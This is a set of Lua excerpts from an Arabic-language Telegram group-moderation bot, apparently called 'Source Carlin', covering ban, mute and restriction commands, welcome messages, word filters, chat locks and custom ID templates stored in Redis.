if DevRio:sismember(Carlin..'Rio:Ban:'..msg.chat_id_,result.id_) then banned = 'محظور' else banned = 'غير محظور' end
if DevRio:sismember(Carlin..'Rio:BanAll:',result.id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
if DevRio:sismember(Carlin..'Rio:MuteAll:',result.id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
if DevRio:sismember(Carlin..'Rio:Tkeed:',result.id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙الحظر العام ↫ '..banall..'\n᥀︙الكتم العام ↫ '..muteall..'\n᥀︙الحظر ↫ '..banned..'\n᥀︙الكتم ↫ '..muted..'\n᥀︙التقيد ↫ '..tkeed, 1, 'md')  
else
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')  
end
...
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevRio:srem(Carlin..'Rio:Tkeed:'..msg.chat_id_,result.sender_user_id_) DevRio:srem(Carlin..'Rio:Ban:'..msg.chat_id_,result.sender_user_id_) DevRio:srem(Carlin..'Rio:Muted:'..msg.chat_id_,result.sender_user_id_) DevRio:srem(Carlin..'Rio:BanAll:',result.sender_user_id_) DevRio:srem(Carlin..'Rio:MuteAll:',result.sender_user_id_)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevRio:srem(Carlin..'Rio:Tkeed:'..msg.chat_id_,result.sender_user_id_) DevRio:srem(Carlin..'Rio:Ban:'..msg.chat_id_,result.sender_user_id_) DevRio:srem(Carlin..'Rio:Muted:'..msg.chat_id_,result.sender_user_id_) 
end
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),unbanreply) 
end
...
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevRio:srem(Carlin..'Rio:Tkeed:'..msg.chat_id_,user) DevRio:srem(Carlin..'Rio:Ban:'..msg.chat_id_,user) DevRio:srem(Carlin..'Rio:Muted:'..msg.chat_id_,user) DevRio:srem(Carlin..'Rio:BanAll:',user) DevRio:srem(Carlin..'Rio:MuteAll:',user)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevRio:srem(Carlin..'Rio:Tkeed:'..msg.chat_id_,user) DevRio:srem(Carlin..'Rio:Ban:'..msg.chat_id_,user) DevRio:srem(Carlin..'Rio:Muted:'..msg.chat_id_,user) 
end  
end,nil)  
end
...
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevRio:srem(Carlin..'Rio:Tkeed:'..msg.chat_id_,result.id_) DevRio:srem(Carlin..'Rio:Ban:'..msg.chat_id_,result.id_) DevRio:srem(Carlin..'Rio:Muted:'..msg.chat_id_,result.id_) DevRio:srem(Carlin..'Rio:BanAll:',result.id_) DevRio:srem(Carlin..'Rio:MuteAll:',result.id_)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevRio:srem(Carlin..'Rio:Tkeed:'..msg.chat_id_,result.id_) DevRio:srem(Carlin..'Rio:Ban:'..msg.chat_id_,result.id_) DevRio:srem(Carlin..'Rio:Muted:'..msg.chat_id_,result.id_) 
end
end,nil)   
end  
...
DevRio:set(Carlin.."Rio:GpIds:Text"..msg.chat_id_,Text_Rand)
...
DevRio:set("Carlin:New:id:"..Carlin..msg.sender_user_id_,'CarlinTeam')
return "CarlinTeam"
end
if text and DevRio:get("Carlin:New:id:"..Carlin..msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ كليشة الايدي', 1, 'md')
DevRio:del("Carlin:New:id:"..Carlin..msg.sender_user_id_)
return false
end
DevRio:del("Carlin:New:id:"..Carlin..msg.sender_user_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حفظ كليشة الايدي العامه', 1, 'md')
DevRio:set(Carlin.."Rio:AllIds:Text",text)
return false
end
...
DevRio:del(Carlin.."Rio:AllIds:Text")
end
end
--     Source Carlin     --
if text and text:match("^تعيين الايدي$") and ChCheck(msg) or text and text:match("^تعين الايدي$") and ChCheck(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙رجائا اتبع التعليمات للتعيين \n᥀︙لطبع كليشة الايدي ارسل كليشه تحتوي على النصوص التي باللغه الانجليزيه ادناه ↫ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n `#username` ↬ لطبع المعرف\n `#id` ↬ لطبع الايدي \n `#photos` ↬ لطبع عدد الصور \n `#stast` ↬ لطبع الرتب \n `#msgs` ↬ لطبع عدد الرسائل \n `#msgday` ↬ لطبع الرسائل اليوميه \n `#CustomTitle` ↬ لطبع اللقب \n `#bio` ↬ لطبع البايو \n `#auto` ↬ لطبع التفاعل \n `#game` ↬ لطبع عدد النقاط \n `#cont` ↬ لطبع عدد الجهات \n `#edit` ↬ لطبع عدد السحكات \n `#Description` ↬ لطبع تعليق الصور\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉', 1, 'md')
DevRio:set("Carlin:New:id:"..Carlin..msg.chat_id_..msg.sender_user_id_,'CarlinTeam')
return "CarlinTeam"
end
if text and Manager(msg) and DevRio:get("Carlin:New:id:"..Carlin..msg.chat_id_..msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ كليشة الايدي', 1, 'md')
DevRio:del("Carlin:New:id:"..Carlin..msg.chat_id_..msg.sender_user_id_)
return false
end
DevRio:del("Carlin:New:id:"..Carlin..msg.chat_id_..msg.sender_user_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حفظ الكليشه الجديده', 1, 'md')
DevRio:set(Carlin.."Rio:GpIds:Text"..msg.chat_id_,text)
return false
end
if text and text:match("^حذف الايدي$") and ChCheck(msg) or text and text:match("^مسح الايدي$") and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف كليشة الايدي")  
DevRio:del(Carlin.."Rio:GpIds:Text"..msg.chat_id_)
end
end
--     Source Carlin     --
if msg.reply_to_message_id_ ~= 0 then
...
function CarlinTeam(extra,rio,success)
...
local msgsday = DevRio:get(Carlin..'Rio:UsersMsgs'..Carlin..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local edit_msg = DevRio:get(Carlin..'Rio:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevRio:get(Carlin..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local user_nkt = tonumber(DevRio:get(Carlin..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
local cont = (tonumber(DevRio:get(Carlin..'Rio:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
...
if not DevRio:get(Carlin..'Rio:Lock:Id'..msg.chat_id_) then 
if not DevRio:get(Carlin..'Rio:Lock:Id:Photo'..msg.chat_id_) then 
if DevRio:get(Carlin.."Rio:AllIds:Text") then
newpicid = DevRio:get(Carlin.."Rio:AllIds:Text")
...
if not DevRio:get(Carlin.."Rio:GpIds:Text"..msg.chat_id_) then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, rio.photos_[0].sizes_[1].photo_.persistent_id_,newpicid,msg.id_,msg.id_.."")
else 
local new_id = DevRio:get(Carlin.."Rio:GpIds:Text"..msg.chat_id_)
...
if DevRio:get(Carlin.."Rio:AllIds:Text") then
newallid = DevRio:get(Carlin.."Rio:AllIds:Text")
...
if DevRio:get(Carlin.."Rio:AllIds:Text") then
notpicid = DevRio:get(Carlin.."Rio:AllIds:Text")
...
if not DevRio:get(Carlin..'Rio:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل التعديل")  
DevRio:set(Carlin..'Rio:Lock:EditMsgs'..msg.chat_id_,true)
else
...
DevRio:set(Carlin.."Rio:Lock:Bots"..msg.chat_id_,"ked")  
end
if LockText[2] == "التكرار" or LockText[2] == "التكرار بالحذف" then 
DevRio:hset(Carlin.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User","del")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل التكرار بالحذف")  
end
if LockText[2] == "التكرار بالطرد" then 
DevRio:hset(Carlin.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User","kick")  
...
DevRio:hset(Carlin.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل التكرار بالتقيد")  
end
if LockText[2] == "التكرار بالكتم" then 
DevRio:hset(Carlin.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User","mute")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل التكرار بالكتم")  
end
if BasicConstructor(msg) then
if LockText[2] == "التثبيت" then
if not DevRio:get(Carlin..'Rio:Lock:Pin'..msg.chat_id_) then
tdcli_function ({ ID = "GetChannelFull",  channel_id_ = msg.chat_id_:gsub("-100","") }, function(arg,data)  DevRio:set(Carlin.."Rio:PinnedMsg"..msg.chat_id_,data.pinned_message_id_)  end,nil)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل التثبيت")  
DevRio:set(Carlin..'Rio:Lock:Pin'..msg.chat_id_,true)
DevRio:sadd(Carlin.."Rio:Lock:Pinpin",msg.chat_id_) 
else
...
DevRio:hset(Carlin.."Rio:Spam:Group:User"..msg.chat_id_ ,"Num:Spam" ,TextSpam) 
end
end
if text and (text:match("^ضع زمن التكرار (%d+)$") or text:match("^وضع زمن التكرار (%d+)$")) then  
local TextSpam = text:match("ضع زمن التكرار (%d+)$") or text:match("وضع زمن التكرار (%d+)$")
DevRio:hset(Carlin.."Rio:Spam:Group:User"..msg.chat_id_ ,"Num:Spam:Time" ,TextSpam) 
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, CarlinTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Carlin..'Rio:Lock:Id:Photo'..msg.chat_id_)
end end
if text and text == 'تعطيل الايدي بالصوره' and ChCheck(msg) then
if DevRio:get(Carlin..'Rio:Lock:Id:Photo'..msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙الايدي بالصوره بالتاكيد معطل', 1, 'md')
else
local CarlinTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الايدي بالصوره'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, CarlinTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Carlin..'Rio:Lock:Id:Photo'..msg.chat_id_,true)
end end 
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, CarlinTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Carlin..'Rio:Lock:Id'..msg.chat_id_)
end end 
if text and text == 'تعطيل الايدي' and ChCheck(msg) then
if DevRio:get(Carlin..'Rio:Lock:Id'..msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙الايدي بالتاكيد معطل ', 1, 'md')
else
local CarlinTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الايدي بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, CarlinTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Carlin..'Rio:Lock:Id'..msg.chat_id_,true)
end end
end
--     Source Carlin     --
...
DevRio:setex(Carlin.."Rio:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_,300,true) 
end
if text == 'انشاء رابط' and ChCheck(msg) or text == 'انشاء الرابط' and ChCheck(msg) then
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if not DevRio:get(Carlin.."Rio:Groups:Links"..msg.chat_id_)  then 
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
DevRio:set(Carlin.."Rio:Groups:Links"..msg.chat_id_,LinkGroup) 
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, CarlinTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Carlin.."Rio:Lock:Welcome"..msg.chat_id_,true)
end
if text and text:match("^تعطيل الترحيب$") and ChCheck(msg) then
local CarlinTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الترحيب بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, CarlinTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Carlin.."Rio:Lock:Welcome"..msg.chat_id_)
end
if DevRio:get(Carlin..'Rio:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_) then 
if text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ كليشة الترحيب', 1, 'md')
DevRio:del(Carlin..'Rio:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevRio:del(Carlin..'Rio:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
Welcomes = text:gsub('"',"") Welcomes = text:gsub("'","") Welcomes = text:gsub(",","") Welcomes = text:gsub("*","") Welcomes = text:gsub(";","") Welcomes = text:gsub("`","") Welcomes = text:gsub("{","") Welcomes = text:gsub("}","") 
DevRio:set(Carlin..'Rio:Groups:Welcomes'..msg.chat_id_,Welcomes)
...
DevRio:set(Carlin..'Rio:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
if text and text:match("^حذف الترحيب$") and ChCheck(msg) or text and text:match("^حذف ترحيب$") and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف الترحيب")  
DevRio:del(Carlin..'Rio:Groups:Welcomes'..msg.chat_id_)
end
if text and text:match("^جلب الترحيب$") and ChCheck(msg) or text and text:match("^جلب ترحيب$") and ChCheck(msg) or text and text:match("^الترحيب$") and ChCheck(msg) then
local Welcomes = DevRio:get(Carlin..'Rio:Groups:Welcomes'..msg.chat_id_)
if Welcomes then
Dev_Rio(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
else
...
--     Source Carlin     --
if DevRio:get(Carlin..'Rio:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_) then  
if text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء حفظ الوصف", 1, 'md')
DevRio:del(Carlin..'Rio:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevRio:del(Carlin..'Rio:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
...
DevRio:set(Carlin..'Rio:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_,true)
...
DevRio:set(Carlin.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_,"add")  
return false  
end    
if DevRio:get(Carlin.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "add" then
if text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر المنع', 1, 'md')
DevRio:del(Carlin.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
return false  
end   
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم منع الكلمه ↫ "..text, 1, 'html')
DevRio:del(Carlin.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
DevRio:hset(Carlin..'Rio:Filters:'..msg.chat_id_, text,'newword')
return false
end
if text and text == "الغاء منع" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then       
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙ارسل لي الكلمه الان", 1, 'md') 
DevRio:set(Carlin.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_,"del")  
return false  
end    
if DevRio:get(Carlin.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "del" then   
if text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر الغاء المنع', 1, 'md')
DevRio:del(Carlin.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
return false  
end   
if not DevRio:hget(Carlin..'Rio:Filters:'..msg.chat_id_, text) then  
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙الكلمه ↫ "..text.." غير ممنوعه", 1, 'html')
DevRio:del(Carlin.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
else
DevRio:hdel(Carlin..'Rio:Filters:'..msg.chat_id_, text)
...
local gps = DevRio:scard(Carlin.."Rio:Groups") local users = DevRio:scard(Carlin.."Rio:Users") 
...
local users = DevRio:scard(Carlin.."Rio:Users")
...
local gps = DevRio:scard(Carlin.."Rio:Groups")
...
if not DevRio:get(Carlin..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_) then  
...
DevRio:setex(Carlin..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
end 
end
...
local pv = DevRio:smembers(Carlin.."Rio:Users")
local sendok = 0
for i = 1, #pv do
...
DevRio:srem(Carlin.."Rio:Users",pv[i])
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
...
local group = DevRio:smembers(Carlin.."Rio:Groups")
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
DevRio:srem(Carlin.."Rio:Groups",group[i]) 
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = group[i], user_id_ = Carlin, status_ = { ID = "ChatMemberStatusLeft" }, }, dl_cb, nil)
w = w + 1
end
...
'Rio:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'مقفوله' else lock_arabic = 'مفتوحه' end local CarlinTeam = "\n" .."᥀︙العربيه ↫ "..lock_arabic.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, CarlinTeam, 1, 'md') end
if text == "الانكليزيه" then if DevRio:get(Carlin..'Rio:Lock:English'..msg.chat_id_) then lock_english = 'مقفوله' else lock_english = 'مفتوحه' end local CarlinTeam = "\n" .."᥀︙الانكليزيه ↫ "..lock_english.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, CarlinTeam, 1, 'md') end
if text == "الكفر" then if DevRio:get(Carlin..'Rio:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end local CarlinTeam = "\n" .."᥀︙الكفر ↫ "..lock_kaf.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, CarlinTeam, 1, 'md') end
if text == "الفشار" then if DevRio:get(Carlin..'Rio:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end local CarlinTeam = "\n" .."᥀︙الفشار ↫ "..lock_fshar.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, CarlinTeam, 1, 'md') end
if text == "الطائفيه" then if DevRio:get(Carlin..'Rio:Lock:Taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفله' end local CarlinTeam = "\n" .."᥀︙الطائفيه ↫ "..lock_taf.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, CarlinTeam, 1, 'md') end
end
--     Source Carlin     --
if text == 'تفعيل كشف الاعدادات' and ChCheck(msg) then 
local CarlinTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل كشف الاعدادات'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, CarlinTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Carlin..'Rio:LockSettings'..msg.chat_id_,true)  
end
if text == 'تعطيل كشف الاعدادات' and ChCheck(msg) then 
local CarlinTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل كشف الاعدادات'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, CarlinTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Carlin..'Rio:LockSettings'..msg.chat_id_) 
end
--     Source Carlin     --
if text == 'تفعيل اوامر التحشيش' and Manager(msg) and ChCheck(msg) then 
local CarlinTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل اوامر التحشيش'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, CarlinTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Carlin..'Rio:Lock:Stupid'..msg.chat_id_)
end
if text == 'تعطيل اوامر التحشيش' and Manager(msg) and ChCheck(msg) then 
local CarlinTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل اوامر التحشيش'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, CarlinTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Carlin..'Rio:Lock:Stupid'..msg.chat_id_,true)
end
--     Source Carlin     --
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, CarlinTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Carlin..'Rio:Lock:Robot'..msg.chat_id_)
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, CarlinTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Carlin..'Rio:Lock:Robot'..msg.chat_id_,true)
end
--     Source Carlin     --
if text == 'تفعيل ردود المدير' and Manager(msg) and ChCheck(msg) then 
local CarlinTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل ردود المدير'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, CarlinTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Carlin..'Rio:Lock:GpRed'..msg.chat_id_)
end
if text == 'تعطيل ردود المدير' and Manager(msg) and ChCheck(msg) then 
local CarlinTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل ردود المدير'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, CarlinTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Carlin..'Rio:Lock:GpRed'..msg.chat_id_,true)
end
--     Source Carlin     --
if text == 'تفعيل ردود المطور' and Manager(msg) and ChCheck(msg) then 
local CarlinTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل ردود المطور'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, CarlinTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Carlin..'Rio:Lock:AllRed'..msg.chat_id_)
end
if text == 'تعطيل ردود المطور' and Manager(msg) and ChCheck(msg) then 
local CarlinTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل ردود المطور'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, CarlinTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Carlin..'Rio:Lock:AllRed'..msg.chat_id_,true)
end
--     Source Carlin     --
if SecondSudo(msg) then
...
--     Source Carlin     --
if msg.content_.photo_ then
if DevRio:get(Carlin..'Rio:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_) then
if msg.content_.photo_.sizes_[3] then
...
DevRio:del(Carlin..'Rio:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
return false  end
if data.message_ == "CHAT_ADMIN_REQUIRED" then 
send(msg.chat_id_, msg.id_,"᥀︙ليست لدي صلاحية تغير معلومات المجموعه يرجى التحقق من الصلاحيات") 
DevRio:del(Carlin..'Rio:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
...
DevRio:set(Carlin..'Rio:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
--     Source Carlin     --
...
if data.ID == "Ok" then
DevRio:del(Carlin..'Rio:PinnedMsg'..msg.chat_id_)
...
local PinId = DevRio:get(Carlin..'Rio:PinnedMsg'..msg.chat_id_)
if PinId then
...
DevRio:del(Carlin..'Rio:Ban:'..msg.chat_id_)
else
local x = 0
...
local Muted = DevRio:scard(Carlin.."Rio:Muted:"..msg.chat_id_) or "0"
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
...
local ConstructorList = DevRio:scard(Carlin.."Rio:Constructor:"..ChatId) or 0
local BanedList = DevRio:scard(Carlin.."Rio:Ban:"..ChatId) or 0
local ManagerList = DevRio:scard(Carlin.."Rio:Managers:"..ChatId) or 0
local MutedList = DevRio:scard(Carlin.."Rio:Muted:"..ChatId) or 0
local TkeedList = DevRio:scard(Carlin.."Rio:Rio:Tkeed:"..ChatId) or 0
local AdminsList = DevRio:scard(Carlin.."Rio:Admins:"..ChatId) or 0
local VipList = DevRio:scard(Carlin.."Rio:VipMem:"..ChatId) or 0
...
ConstructorRio = "["..Rio.first_name_.."](T.me/"..(Rio.username_ or "TOLENTEam")..")"
else 
...
ChatLeave(dp.id_, Carlin)
DevRio:srem(Carlin.."Rio:Groups", dp.id_)
else
...
DevRio:set(Carlin..'Rio:Num:Add:Bot',Num) 
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, CarlinTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Carlin..'Rio:Lock:FreeBot'..Carlin) 
end 
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, CarlinTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Carlin..'Rio:Lock:FreeBot'..Carlin,true) 
end 
end
if ChatType == 'sp' or ChatType == 'gp'  then
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, CarlinTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Carlin..'Rio:Photo:Profile'..msg.chat_id_) 
end
if text == 'تفعيل صورتي' and Manager(msg) and ChCheck(msg) then  
local CarlinTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل صورتي بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, CarlinTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Carlin..'Rio:Photo:Profile'..msg.chat_id_,true)  
end
if text == 'تفعيل الالعاب' and Manager(msg) and ChCheck(msg) or text == 'تفعيل اللعبه' and Manager(msg) and ChCheck(msg) then   
local CarlinTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل الالعاب بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, CarlinTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Carlin..'Rio:Lock:Games'..msg.chat_id_) 
end
if text == 'تعطيل الالعاب' and Manager(msg) and ChCheck(msg) or text == 'تعطيل اللعبه' and Manager(msg) and ChCheck(msg) then  
local CarlinTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الالعاب بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, CarlinTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Carlin..'Rio:Lock:Games'..msg.chat_id_,true)  
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, CarlinTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Carlin..'Rio:Lock:Gamesinline'..msg.chat_id_) 
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, CarlinTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Carlin.."Rio:Lock:GpLinks"..msg.chat_id_,"ok")
return false  
end
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, CarlinTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Carlin.."Rio:Lock:Rd"..msg.chat_id_)
return false  
end
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, CarlinTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Carlin.."Rio:Lock:GpLinksinline"..msg.chat_id_,"ok")
return false  
end
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, CarlinTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Carlin.."Rio:Lock:GpLinksinline"..msg.chat_id_)
return false  
end
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, CarlinTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Carlin.."Rio:Lock:Rd"..msg.chat_id_,true)
return false  
end
end
...
ReplyStatus(msg,result.id_,"ReplyBy","᥀︙تم تفعيل المجموعه "..dp.title_)  
